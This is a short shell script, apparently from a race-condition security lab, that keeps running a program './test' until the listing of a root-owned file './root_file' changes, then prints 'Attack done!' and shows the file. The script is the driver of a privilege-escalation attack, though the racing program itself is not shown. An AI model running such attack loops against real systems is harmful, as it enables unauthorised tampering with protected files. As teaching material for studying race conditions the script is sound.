old=`ls -l ./root_file`
new=`ls -l ./root_file`

while [ "$old" = "$new" ]
do
    ./test
    new=`ls -l ./root_file`
done

echo "Attack done!"
cat ./root_file
